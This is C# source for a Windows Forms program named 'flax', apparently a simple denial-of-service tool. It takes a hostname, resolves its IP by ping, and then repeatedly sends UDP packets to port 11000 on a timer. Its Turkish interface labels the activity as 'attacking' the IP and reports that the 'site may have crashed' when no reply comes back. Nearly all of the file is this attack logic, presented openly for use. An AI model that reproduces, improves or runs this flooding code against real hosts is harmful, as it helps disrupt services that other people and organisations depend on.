using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace flax
{
    public partial class flaxMain : Form
    {
        string host = "";
        string hostip = "";
        int pingcount = 1;

        public flaxMain()
        {
            InitializeComponent();
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            transpar(label1);
            transpar(label2);
            transpar(label3);

        }

        public void transpar(Label label1)
        {
            var pos = this.PointToScreen(label1.Location);
            pos = pictureBox1.PointToClient(pos);
            label1.Parent = pictureBox1;
            label1.Location = pos;
            label1.BackColor = Color.Transparent;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            host = textBox1.Text;

            Ping ping = new Ping();
            try
            {
                int timeout = 3000;
                PingReply pingreply = ping.Send(host, timeout);
                if (pingreply.Status == IPStatus.Success)
                {
                    hostip = pingreply.Address.ToString();
                }
            }
            catch (PingException ex)
            {
                MessageBox.Show("Lütfen geçerli bir IP adresi giriniz.", "flax", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

            textBox1.ReadOnly = true;
            udptimer.Start();
            button2.Enabled = true;
            button1.Enabled = false;
        }

        public async Task pingat(string hostname)
        {
            try
            {
                Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);

                IPAddress serverAddr = IPAddress.Parse(hostname);

                IPEndPoint endPoint = new IPEndPoint(serverAddr, 11000);

                string text = "flax-c9df87bf6c80ba7eef2bec415ad7e939-flax";
                byte[] send_buffer = Encoding.ASCII.GetBytes(text);

                sock.SendTo(send_buffer, endPoint);

                label3.Text = "[" + pingcount.ToString() + "] Saldırılıyor. IP Adresi: " + hostname + "\r\n";
                pingcount++;
                await Task.Delay(1);
            }
            catch
            {
                label3.Text = "";
                pingcount = 0;
                button2.Enabled = false;
                button1.Enabled = true;
                udptimer.Stop();
                textBox1.ReadOnly = false;
                MessageBox.Show("UDP paketine cevap gelmedi.\r\nSite çökmüş olabilir.", "flax", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        private async void udptimer_Tick(object sender, EventArgs e)
        {
            await pingat(hostip);
        }

        private void button2_Click(object sender, EventArgs e)
        {
            label3.Text = "";
            pingcount = 0;
            button2.Enabled = false;
            button1.Enabled = true;
            udptimer.Stop();
            textBox1.ReadOnly = false;
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            if (textBox1.Text != "")
            {
                button1.Enabled = true;
            }
            else
            {
                button1.Enabled = false;
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            Hakkinda hkn = new Hakkinda();
            hkn.Show();
        }
    }
}
